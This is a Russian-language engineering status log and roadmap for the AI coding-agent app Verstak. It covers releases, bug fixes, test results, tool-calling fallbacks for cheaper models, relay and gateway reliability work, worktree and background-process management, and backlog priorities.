  - ✅ **#5 browser-проверка + MP4 → Proof** (`abe9f89`,`1bda9a8`): `browser_click` (клик по селектору/тексту во вкладке Browser) + `create_proof_video` (кадры browser_screenshot прогона → MP4 в `.verstak/proof/` через ffmpeg) — видео live-проверки веб-сценария для Proof Pack (РФ-угол). Encoder live-проверен реальным ffmpeg (3 PNG→MP4). Полный browser→video цикл — 1 живой клик (Browser-вкладка). Глубокая Proof-Pack хэш-цепочка — follow-up.
  - ✅ **#3 ветвление сессий (fork)** (`6627242`,`d0b60ae`): бэкенд `sessions.fork` (новая main-сессия с копией истории до точки, parentChatId=источник → дерево; +4 теста, sqlite-валиден при закрытом dev) + IPC/preload/тип + store `forkChat` + Sidebar контекст-меню «⑂ Ветвить» + индикатор ⑂. Полная визуализация дерева — follow-up. UI — 1 живой клик.
- 💡 Новые фишки (бэклог): TG-двусторонний-пульт к Gateway (статус/approve/Proof + воронка), Proof Pack как юр-артефакт сдачи, PTC-витрина «стоимость хода».

---

## 🎯 Verstak v3 — машина задачи (СЕВЕР)

Тезис: **результат уровня Opus на дешёвой модели (DeepSeek)** через ХАРНЕС (надёжность в коде, не в доверии модели). Юзер — РФ SMB, BYO-токен, локально, без VPN. Конкурент — OpenCode/Manus и «нанять фрилансера», не ChatGPT. Полный план: `Downloads/verstak-product-plan-v3-2026-06-19.md` + план #5 в Verstak. Вдохновлено разбором OpenCode/ClawCode.

- ✅ **A. Ядро надёжности** (4b8e771) — verify-gate: модель не вправе сказать «готово», провал → авто-починка, лимит → честный стоп `blocked`. pipeline-gate (6 тестов) + миграция 24.
- ✅ **B. Task-spec контракт** (aba770c) — дорогая модель пишет детальные ТЗ-задачи → дешёвая исполняет. TASK_SPEC_CONTRACT в buildPlanPrompt/create_plan + scoreTaskSpec (6 тестов). **Рычаг «Opus на дешёвой».**
- ✅ **C. Профиль проекта** (97d7d55) — machine-readable `.verstak/profile.json`, self-load в context-pack каждой сессии (8 тестов).
- ✅ **D. Промпт-пресеты + beast + max-steps** (fd298da + d653b77) — beast-автономность (auto/bypass) + max-steps hard-stop (последний turn: тулзы off + отчёт). 10 тестов. Минор-остаток: per-family тюнинг, CLI-паритет.
- ✅ **E. Доказательство Opus-на-DeepSeek** — прокликано вживую 19.06 (марафон), харнес A–E работает end-to-end. Тезис подтверждён.
- ⬜ Бонус: LSP-тул + per-role профили (не блокирует).

**Зарелизено в `1.5.18`** (19.06), сейчас в проде `1.5.29`. Харнес A–E **прокликан вживую 19.06 и работает** (`TASK-ilya-v3-livetest.md`). Бонус: per-role (#7) покрыт role-tools; LSP (#6) — отдельной сессией, не блокирует.

---

## 🩹 Открытые хвосты (наши задачи, не закрыты)

| # | Что | Почему висит | Зона |
|---|-----|--------------|------|
| 1 | Облачный дизайн-полиш Pipeline-UI | ТЗ выдано (DESIGN_BRIEF), ждём облачного агента в ветке `design/cloud-polish` | внешн. |
| 2 | **Gateway-баги → отдать Codex** | Пакет file:line+фиксы: `Downloads/IRI-Gateway-баги-ревью-2026-06-23.md`. Начать с 🔴 двойного начисления баланса + овердрафта. Память: [[review-2026-06-23]] | Codex |
| 3 | **Решение по архитектуре скиллов** | ✅ Вариант (2) pre-commit хук СДЕЛАН (23.06: `.githooks/pre-commit` → `scripts/precommit.cjs`, type жёстко + тесты с ABI-awareness, gate-lib под TDD, активируется через `npm install`). Остаются на выбор Павла: (1) аудит 50+ скиллов; (3) тонкий `/verstak`-скилл | Павел |

---

## ✅ Сделано (03.07 — tool-mode hardening под OpenAI-compat/китайские модели, в main, не зарелизено)

Точечный production-hardening существующего agent loop под нестабильный tool-calling дешёвых/китайских моделей (commit `ddd5161`). Без новых больших модулей и без рефакторинга — расширены существующие `smart-fallback.ts` и `runApiConversation`, добавлен один малый слой знаний `tool-mode.ts`.

**Что сделано:**
- `tool-mode.ts` (новый) — слой model/tool compatibility: `resolveToolMode` (`native`/`json`), `isCoaxableProvider`, `JSON_TOOL_INSTRUCTION`, `IGNORED_TOOLS_NUDGE`. Консервативно: неизвестное → `native`, старые провайдеры не затронуты.
- JSON tool mode для моделей, плохо держащих native tools (`deepseek-reasoner`/R1, локальный Ollama): один раз инжектится инструкция отдавать вызов текстом `<tool_call>{…}</tool_call>` — его ловит уже существующий `parseTextToolCalls`.
- Corrective nudge, когда модель ответила прозой и не вызвала ни одного инструмента: `continueAfterPlainReply` для coaxable-провайдеров при `toolCallCount===0` один раз просит выбрать тул или явно завершить (bounded), вместо тихого «готово».
- Расширены fallback-классы: `FallbackReason` + чистые `classifyFallbackReason`/`fallbackPlan`; `shouldFallback` теперь триггерит и на auth-ошибке (битый ключ → другой провайдер).
- china→china fallback chains перед дорогими frontier (deepseek↔qwen↔moonshot, потом gemini/claude/openai).
- Тесты: `tool-mode.test.ts` (новый) + расширен `smart-fallback.test.ts`.

**Почему важно для DeepSeek/Qwen/Kimi/GLM:** симптом «DeepSeek не работает в режиме управления компьютером» = слабая/reasoning-модель игнорировала native `tools`, отвечала прозой → цикл завершался «готово», не сделав ничего. Теперь такие модели либо получают JSON-режим, либо один corrective-retry, либо уходят на соседнюю дешёвую модель — не молчаливый провал.

**Сценарии теперь покрыты:** DeepSeek native OK (без изменений) · Qwen malformed JSON repaired (было) · model ignored tools → corrective retry (новое) · native unsupported → JSON mode (новое) · rate limit → fallback model (усилено china-цепочками) · dangerous command всё так же блокируется policy (fallback-фрейм переиспользует тот же dispatch).

**Ограничения (осознанно оставлены):**
- `fallbackPlan` пока не полностью встроен в `attemptProviderFallback` (проброшен только расширенный `shouldFallback`).
- Malformed **native** arguments лечатся реактивно через `tool_result`, без отдельного corrective retry в `openai-compat.ts`.
- Следующий этап — agentic fallback routing по `FallbackReason`.

## ✅ Сделано (23.06 ч.2 — reliability-батч, зарелизено в 1.5.29)

Разбор ревью-хвоста B + свежий ре-ревью reliability-поверхности (workflow 4 reviewer'а × адверсариальная верификация, т.к. лог `wf_c485e0e0` потерян). Найдено и пофикшено **5 реальных багов**, все TDD (тест воспроизводит баг → фикс), все в зоне `electron/ai` + `electron/storage`:

- **#1 (user-facing) Стоп во время retry-backoff падал в 'crashed' + страшный error-тост.** `sleep()` в `withInitialRetry` бросает `Error('aborted')`, которая вылетала мимо per-event abort-проверок прямо в внешний catch — без guard'а run писался `failed` и юзер видел ошибку, хотя сам нажал Стоп. Фикс: `if (signal.aborted)` первой строкой catch → чистый `aborted`/`stopped`. (`ai.ts`)
- **#3 supervisor-нота при зацикливании была мёртвым кодом** — пушилась в историю и тут же `return`, модель её не видела. Фикс: bounded nudge — нота скармливается модели (1 шанс сменить подход), при повторном зацикливании hard-stop. (`ai.ts`)
- **F2 (HIGH) `writeSessionJournal` — выпилен в void-стаб** регрессией `4f94c72` («session journal updates» по факту убил журнал). Журнал сессии тихо не писался на всех exit-путях, хотя ai.ts это гарантирует. Восстановлено по `3401bdc`. (`session-journal.ts`)
- **F3 (HIGH) undo floor-protection перетирался между чатами** — `floors` keyed по проекту, второй чекпоинт затирал первый → ранние undo-записи первого чата теряли защиту от prune → частичный откат. Фикс: чистый `FloorTracker` (несколько активных floor'ов, защита по MIN) + `clearProtection(projectPath, floorId?)`. (`undo-floors.ts` нов., `undo.ts`, `ipc/undo.ts`)
- **F1 (medium) `shouldFallback` смотрел только message, не `.code`** — обёрнутая сетевая ошибка (ECONNRESET в `.code`, но не в тексте) не уходила в фолбэк. Зеркалит `isRetriableError`. (`smart-fallback.ts`)
- **#2 cross-verify на max-turns — решено by-design:** max-turns = незавершённая работа, ревью половины кода = шум; cross-verify остаётся только на `completed`.

**Тесты: +13** (smart-fallback 4, undo-floors 7 pure, agent-loop +1 F2, undo.test +1 sqlite-интеграция мульти-чекпоинт). agent-loop +#1/#3 ранее. type ✓. **Полный набор 1420 зелёных** (better-sqlite3 пересобран под Node ABI, sqlite-интеграция F3 подтверждена на реальной БД).

## ✅ Сделано (23.06 ч.3 — догфудинг-ревью Verstak'ом самого себя, зарелизено в 1.5.30)

Ревью внутри Verstak (вкладка Code-review) нашло 3 находки в области ч.2 — **ВСЕ ЗАКРЫТЫ properly** (не band-aid):
- **finding 2+3 (§5 PerChatState bundle):** `checkpointId`/`preflights`/`subagentRuns` внесены в `ChatStateBundle` (типы PreflightCard/SubagentRunCard перенесены в store-agnostic `session-snapshot.ts` + re-export для Chat.tsx) → **сохраняются per-chat** при переключении чата/проекта/выхода из справки, чужие НЕ утекают (каждый чат восстанавливает свой). f2: кнопка отката больше не пропадает при переключении чатов. f3: карточки активности не залипают (preserve вместо reset — лучше для фоновых чатов). switchChatSession/setProject/leaveHelpMode/openHelpChat сведены на captureBundle/restoreBundle (убрана 4-я рукописная копия литерала). Локирующие тесты переписаны под preserve-семантику + roundtrip. **type ✓, store 54 зелёных.**
- **finding 1 (durability):** undo `floors` теперь **персистятся в SQLite** (миграция 28 `undo_floors`) + гидратация при старте `createUndoStack` → переживают краш (раньше in-memory терялись, prune съедал пост-чекпоинт записи). +3 sqlite-теста (durability/restart/дубликат floor). **type ✓, полный набор 1424 зелёных (sqlite на реальной БД).**

## ✅ Сделано (21.06)

- **Тех-долг §5 — распил `projectStore` (1308 → 905 строк, −403/−31%).** Пять behavior-preserving шагов под type+тесты: (1) ядро роутинга стрим-событий `applySnapshotEvent` (3× near-duplicate → 1 модуль, +13 тестов); (2) операции над сообщениями `lib/chat-messages` (дедуп 5+ мест, +10); (3+4) **структурный распил на zustand-слайсы** `pipeline-slice` + `review-slice` (8 review-методов + ReviewState + 4 pipeline-метода вынесены, ProjectState = Main & PipelineSlice & ReviewSlice). Перед структурным распилом — **состязательный архитектурный ревью плана** (4 агента + verify): вердикт GO, все «high» приземлены (цикл импортов → type-only `interface`; задвоение/токены → дисциплина исполнения, не дефект). Чеклист ревью соблюдён: `StateCreator<ProjectState>` над полным типом, `import type` обратное ребро, спред справа, тела Main не тронуты, страж partial-merge (cleanupReviewsFor не обнуляет main). **+24 теста, вся суита 1354 зелёных, type ✓.** Коммиты 9be3905/3ef960f/5f51d4c/17f0e4f. ⚠️ Renderer-изменения — нужен разовый клик-тест сборки (Pipeline-баннер + 🔍 Review) как финальная страховка.

## ✅ Сделано (20.06)

- **Мердж автообновления Ильи + адверсариальный ревью + харднинг (→ войдёт в 1.5.23).** Влил `filatov/main` (модульный рефактор апдейтера `electron/autoupdate/`), решил конфликты (версия/changelog). Перед выкаткой всем прогнал ревью flow установки (9 агентов) — поймал реальный HIGH: новый flow требует системный `node.exe` для распаковки/установки (у dev-юзеров Павел/Илья есть → сработает; у будущих не-dev нет). Остальное проверка приземлила (залипание installing само-восстанавливается; robocopy-откат не регрессия; «.cmd node» ложное). Точечные безопасные фиксы (e7441cf): фильтр node.exe, busy-guard (нет ложного тоста ошибки), идемпотентность install, восстановление из застрявшего installing, понятное сообщение node-missing. +3 теста, 1330 зелёных. **ХВОСТ ИЛЬЕ** (его зона, нужен E2E на чистой машине без Node): настоящий zero-Node автоапдейт — бандл `node.exe` в extraResources ИЛИ PS-rewrite helper'а; + medium-харднинг robocopy-откат/silent-installer fallback.
- **Аудит надёжности релея (12 агентов, живой сервер) + закрытие находок.** После релея прогнал состязательный аудит «будет ли у юзеров чётко». Подтверждено ОК: стриминг/cost-pill/корректность, релей не open-proxy, авторизация не байпасится, серт до сентября + автопродление. **Найдена и закрыта реальная дыра (не Verstak):** на сервере релея CRM-порт AI-BOS `8765` торчал в интернет без firewall — анонимный дамп задач+карточек клиентов с PII. Закрыл `iptables`-правилом (DROP снаружи, loopback/nginx целы), персист на ребут, проверено снаружи (таймаут), `ai-bos.ru` и релей не затронуты. **Код Verstak (фолбэк + override):** verstak-gateway получил `fallbackBaseUrl` (прямой Амстердам) — при сетевом падении релея openai-compat авто-ретраит тем же ключом на прямой хост (только сетевой сбой, не HTTP-ошибки, не отмена); плюс override релея через настройку `verstak_gateway_baseurl` (kill-switch без релиза). +5 тестов (gateway-fallback), type ✓, ai+lib 703 зелёных. **Укрепление релея (сделано):** swap 2ГБ + nginx Restart=on-failure. **Постоянный домен (сделано):** добавил A-запись `api-ru.agi-iri.ru→194.87.187.234` в reg.ru (форма открылась со 2-го клика по типу), расширил серт на него, переключил Verstak baseUrl с IP-хоста sslip.io на `https://api-ru.agi-iri.ru/v1` — смена сервера теперь через DNS без релиза. **Остаток DEBT:** uptime-алёрт релея (нужен канал — UptimeRobot/TG); 9000-вебхук закрыть снаружи+сменить секрет (зона AI-BOS); пулы ключей `IRI_KEYS_*` на шлюзе (для масштаба).
- **🔴→🟢 Надёжность Verstak Gateway РЕШЕНА (корень + фикс, проверено вживую).** Симптом: агентные запросы из Verstak к `api.agi-iri.ru` (Амстердам) рвались «Connection error» на ~1 минуте. Диагноз (через /dev-hq + Workflow): gateway/nginx здоровы, серверный curl и S2S Москва→Амстердам тянут 100КБ за 0.3с — рвёт **РФ last-mile → NL на крупных телах** (16k токенов агентного контекста ≈ 100КБ), нестабильно (undici 408/drop, curl иногда проходит). Фикс — **РФ-релей**: nginx-reverse-proxy на сервере в Москве (`194.87.187.234`) терминирует юзера коротким стабильным хопом и форвардит S2S в Амстердам. Хост — magic-DNS `194-87-187-234.sslip.io` (reg.ru SPA не дал добавить запись под автоматизацией — обошли без reg.ru), LetsEncrypt-серт через HTTP-01. Verstak Gateway baseUrl → релей. **Проверено: 100КБ с ПК через релей 5/5 за <1.5с; живой запрос из приложения Verstak → 200 «Токио» за 2с** (в логе релея `OpenAI/JS` 200). Серверная часть (gateway): async-блокировка event-loop починена (run_in_threadpool+timeout), `#5` cost-pill meta-чанк сделан well-formed, пресеты `verstak/*` разведены на разные апстримы+fallback. **Остаток (DEBT, не блокирует):** sslip.io — бридж; постоянный поддомен `api-ru.agi-iri.ru` добавить когда Павел за компом; релей хардкодом в коде — позже вынести в настройку.
- **Распил `tool-handlers.ts`** (монолит 3156 → 120 строк, 15 модулей в `electron/ipc/tool-handlers/`): чистый рефакторинг, поведение байт-в-байт, `HANDLER_REGISTRY` единый диспетчер, публичный API/реэкспорты сохранены. type ✓ · 1253 теста ✓. Открыл тестируемость хендлеров (§5.3).
- **Verstak Gateway** как провайдер — первым в списке + инструкция подключения, ключи `vsk_live_` (legacy `sk-iri-` принимаются). Бэкенд `api.agi-iri.ru` живой.
- **Chat handoff** — сохранение диалога в Downloads (a22d028).
- **→ Релиз `1.5.22`** (всё выше + бренд Gateway).
- **Покрытие хендлеров (§5.3, после распила)** — +27 тестов на критичные рубежи: ядро DoD `attest_verification` (статус по exitCode, сверка claimed-vs-actual, 8), гейтинг записи `diffConfirmWrite` (block/auto/confirm, 6), гейтинг команд `run_command` + редакция секретов (6), `connector_query` + guard Я.Диск (7). Все side-effect-поверхности гейтятся протестированно.
- **Checkpoint-resume агентного цикла, Фаза 2 (§5.4 резилентность)** — прерванная крахом сессия возобновляется с НАКОПЛЕННЫМ контекстом, а не с turn 0. Миграция 26 (`agent_run_checkpoints`, один снапшот/прогон) + facade save/latest/clear; per-turn снапшот `currentMessages` рядом с tick, очистка на completed; `ai:send` грузит чекпойнт по `resumeFromRunId` и подаёт историю минуя пере-сборку system; `parseResumeCheckpoint` (строгая валидация → мягкий фоллбэк). Цепочка ResumeBanner→Chat→ai:send замкнута. **+20 тестов (storage 7, loop save/clear, parse 6). Backend под ключ; UI-glue resume — на живую проверку. Тестов: 1303.**

## ✅ Сделано (марафон 17–19.06)

- **Багфиксы:** 3 bug-hunt'а + 4-й по провайдерам — 28+ багов закрыто и запушено.
- **Тех-долг §5:** agent-loop тест-харнес · projectStore дедупликация (3 фазы) · CLI parity · покрытие критичных путей.
- **Pipeline Brief→Proof** (флагман, спек D1→D10): storage(миграция 22)+IPC+store+UI, 33 теста → **1.5.16**.
- **Merge Ильи:** дизайн (таймер ответа, markdown) + фикс установщика «9% install error / не скачивалась» → **1.5.17**.
- **Релизы:** 1.5.13 → 1.5.17, все проверены на скачиваемость.
- **Diagnostic Loop v2** (бэклог): авто-tsc после правок .ts/.tsx → ошибки в контекст агента (коммит 60edc11, в main, не зарелизено).
- **RU Workflow Pack** (бэклог): добавлен Ozon+WB снимок — итого 5 RU-сценариев (цель ≥3 перевыполнена; доки 1.5.3 устарели). Коммит 349283e.
- **Сортировка FilesView** (хвост): папки→файлы (sortFileTree). Коммит ce40ab7.
- **Skill Capture** (бэклог): кнопка «⭐ В скилл» в AgentRunsPanel → скаффолд в ~/.verstak/skills/. Коммит 636d276 (UI-клик — 1 живая проверка).

---

## 🚧 Удалённые проекты (SSH/Git) — в работе

Две модели: git-клон (A, как сейчас + push) + SSH-live (B, правки прямо на сервере, для agi-iri.ru). План #4 в Verstak.

- ✅ Фаза 0: парсер источника (0fec892) · ssh-fs примитивы (0abcd08)
- ✅ Фаза 1: storage-модель `project.kind/remote` миграция 23 (f4f67da)
- ✅ A: git-клон + add-remote IPC (546f4d7) — `addRemote(url)` клонирует репо; **A функционально готов** (нужен UI-вход)
- ✅ **B: роутинг tool-слоя на ssh** (4dd3587) — read/write/run/list/search идут на сервер для ssh-проектов; escape-guard + ssh-denylist + confirm. Локальные не затронуты. **Юнит-тесты вкл. security; реальный ssh-exec — нужна живая проверка на безопасном пути перед прод-сайтом.**
- ⬜ B: undo удалённых файлов (локальный undo не правит ssh-файлы) · degraded для ssh: project-map/user-layer читают локальную ФС (полиш)
- ⬜ UI: «Добавить проект» → выбор источника (папка/GitHub/SSH) — Илья + лайв-тест ssh

## 🔀 Гибридный оркестратор API↔CLI — в работе

Концепт: бесшовное переключение API↔CLI в одном чате. Сверка показала — **~75% уже было** (единый лог, `buildCliPrompt`, context-pack, ручное переключение, delegate_task смешивает API+CLI). Дизайн-док: `docs/hybrid-orchestrator.md`.

- ✅ **Фаза 1**: `detectCliWorthiness` в smart-router (детектор терминальных задач) + honest info-подсказка при API-провайдере. 7 тестов. Решение: подсказка, НЕ молчаливый свитч (контроль/прозрачность).
- ⬜ Фаза 2: UI-pill «Терминальная задача → Claude Code?» в один клик (Илья + живая проверка Сценария А end-to-end).
- ✅ **Фаза 3 (транспорт)**: delegate→CLI проверен и зафиксирован тестами — `buildSubCreateOptions` строит опции claude-cli (oauth+cwd), `claude-cli.send` сериализует через `buildCliPrompt`, `runSubAgentLoop` корректно ловит CLI-стиль (текст без tool-call → completed), usage учитывается в cost-guard. 3 регресс-теста `sub-agent-cli-delegate`. Остался только **живой прогон CLI-бинаря** (нужен сконфигурированный Claude Code).
- 🟡 Честность DoD: CLI обходит denylist Verstak (свой sandbox) — задокументировано, не обещаем обратное.

## 📋 Бэклог (стратегический — на отдельные сессии, по приоритету)

Источник: `verstak-donors-product-strategy` + `verstak_v5_review_and_ideas` (в Downloads).

| Приоритет | Задача | Эффект | Размер |
|-----------|--------|--------|--------|
| ✅ | ~~Diagnostic Loop v2~~ — СДЕЛАНО (60edc11) | — | — |
| ✅ | ~~RU Workflow Pack~~ — СДЕЛАНО (5 сценариев, 349283e) | — | — |
| ✅ | ~~Skill Capture~~ — СДЕЛАНО (636d276) | — | — |
| 🔴 нужна живая проверка | **Agent Registry UI** — инфра УЖЕ есть (AgentsPanel/MultiAgentPicker/role-tools); нужна UX-полировка + клик | multi-agent без хаоса | M |
| 🔴 нужна живая проверка | **Pipeline v1.1** — Agency-режим (через WorkflowsPanel + баннер) | hero для агентств | M |
| 🟠 Electron-coupled | **Proof Pack → PDF + Telegram** — printToPDF (нужен Electron) + отправка | B2B / agency sales | M |
| 🟠 большая инфра | **Remote Pulse** — TG-бот: статус run, approve write, доставка Proof Pack | контроль с телефона | L |
| ✅ | ~~DoD Commit Guard + mandatory DoD setting~~ — СДЕЛАНО и покрыто (dev-task `devtask:commit`, `dod_mode` warn/block/off + override + audit; F2-тесты) | надёжность | — |
| — | Heatmap файлов в FilesView · deep-interview (Gajae) | разное (UI → живая проверка) | S–L |

---

## 🚫 Решено НЕ делать (чтобы не возвращаться)

- Локальный RAG (ONNX в Electron), Docker-песочница, Swarm-дашборд — тяжело, не первыми (из 10 идей ревью).
- Полная миграция компонентов projectStore на map-селекторы — churn без багофикса (ценность §5#1 уже взята дедупом).
- «Русский Cursor» как позиционирование — размывает (controlled workspace + proof + RU ops).

---

*Правило ведения: после каждого закрытого блока — двигаю строку из «Открытые хвосты»/«Бэклог» в «Сделано», обновляю дату/версию сверху. Источники истины по фактам — память (`MEMORY.md`).*
## 2026-07-07 execution update

Competitive master-plan is being closed as implementation, not only planning.
Completed in this pass: `SEC-01..08`, `APP-01..04 + APP-05 seed`, and worktree foundation `WT-01/WT-02` (`189-WT-01..03` in compact plan).
New worktree lifecycle metadata migration `38`, storage model `touch`/`setRefs`/`markRemoved`, and real git dirty/unpushed detector are in code.
Current verification: targeted worktree/storage 12/12 pass, `npm run type` pass.
Full gate still required before commit/release: `npm run test:security`, `npm run test:fast`, `npm run build`.
## 2026-07-07 worktree safety update

Managed worktree lifecycle moved beyond schema/detector: snapshot-before-remove, restore-from-snapshot, lossless remove, and no-push regression are now implemented.
`worktree:merge` and `worktree:discard` use lossless removal, store `snapshot_ref`/`base_ref`, and mark `removed_at` after physical remove.
Targeted verification: `npx vitest run tests/ai/worktree-lifecycle.test.ts tests/ai/worktree-status.test.ts tests/storage/worktree-sessions.test.ts tests/ai/git-worktree.test.ts` -> green, 4 files / 28 tests; `npm run type` -> green.
## 2026-07-07 process manager update

Background process manager foundation is now in code.
Added `ProcessRegistry`, tools `spawn_process`, `process_status`, `read_process`, `stop_process`, bounded/redacted `outputTail`, PID-reuse guard, TTL prune/sweeper API, and command gating before background spawn.
Windows detail: registry keeps the shell handle non-detached so stdout/stderr tail works; process tree stop still uses `taskkill /T /F` through `treeKill`.
PROC-04 is now owner-bound: `notifyOnExit` processes enter a redacted completion queue once, carry `sendId/runId/chatId` ownership, and `runApiConversation` drains only completions for its own `sendId` into the next agent turn. Cross-chat leakage is covered by tests; process exit also writes a best-effort run timeline event.
Targeted verification: `npx vitest run tests/ai/process-registry.test.ts tests/ipc/process-tools.test.ts tests/ipc/agent-loop.test.ts` -> green, 3 files / 32 tests; `npm run type` -> green.
PROC-06 anti-orphan smoke is closed after a real Windows bugfix: `treeKill` now runs `taskkill /T /F` synchronously before fallback `child.kill()`, preventing shell-death races that orphaned the real Node child. New smoke tracks parent PID + grandchild PID and waits for both to die.
Targeted anti-orphan verification: `npx vitest run tests/ai/process-anti-orphan.test.ts tests/ai/process-registry.test.ts` -> green, 2 files / 10 tests.
PROC-08 UI timeline polish is closed: process exits are written as dedicated `process` run events (`process <id> exited`) and Runs panel renders them with a gear icon instead of hiding them as generic tool calls.
Remaining process scope: none for process-manager v1; next master-plan area is managed-worktree UI/release checklist or run lifecycle/wait.

## 2026-07-07 worktree registry update

Managed worktree UI/actions layer is now in code.
Added worktree registry contracts `worktree:list`, `worktree:snapshot`, `worktree:restore`, `worktree:delete` through IPC/preload/renderer types. Storage now exposes `getLatest` and `listProject` so active and closed/restorable sessions can be listed instead of only the current active worktree.
WorktreeBar now has a visible `Снимок` action for the active isolated session. Existing merge/discard remain local-only and no-push.
Release checklist for worktree v1: verify isolate -> edit -> status dirty -> snapshot -> discard/delete -> restore from snapshot -> merge clean path; verify no `git push` path; verify `npm run type`, targeted worktree suite, `npm run test:fast`, `npm run build`.
Targeted verification: `npx vitest run tests/storage/worktree-sessions.test.ts tests/ai/worktree-lifecycle.test.ts tests/ai/worktree-status.test.ts tests/ai/git-worktree.test.ts` -> green, 4 files / 29 tests; `npm run type` -> green.

## 2026-07-07 run lifecycle/wait update

Run lifecycle foundation is now in code.
Added `electron/ai/run-lifecycle.ts` with public `RunStatus`, storage-to-public status mapping, `ExitReason` mapping, terminal-state detection, and `waitForRun()`.
Added IPC `ai:wait(runId, { timeoutMs, pollMs })` through the agent-runs registry, exposed it as `window.api.ai.wait`, and synced renderer types with `RunWaitResult`.
Added `docs/RUN_LIFECYCLE.md` with the state diagram and wait contract. CLI now accepts explicit `--wait`; standalone CLI already waits synchronously, so the flag records/communicates explicit wait mode without changing execution flow.
Targeted verification: `npx vitest run tests/ai/run-lifecycle.test.ts tests/storage/agent-runs.test.ts tests/ipc/agent-runs-wait.test.ts` -> green, 3 files / 37 tests; `npm run type` -> green.

## 2026-07-07 run diagnostics update

Stuck-session diagnostics v1 is now in code.
`agent_runs` DTO exposes `lastEventAt` from stored run events without a new migration. Runs panel shows last activity age for running/queued runs and displays a compact warning badge when a run has no events for 5+ minutes.
Targeted verification: `npx vitest run tests/storage/agent-runs.test.ts tests/ai/run-lifecycle.test.ts tests/ipc/agent-runs-wait.test.ts` -> green, 3 files / 37 tests; `npm run type` -> green.
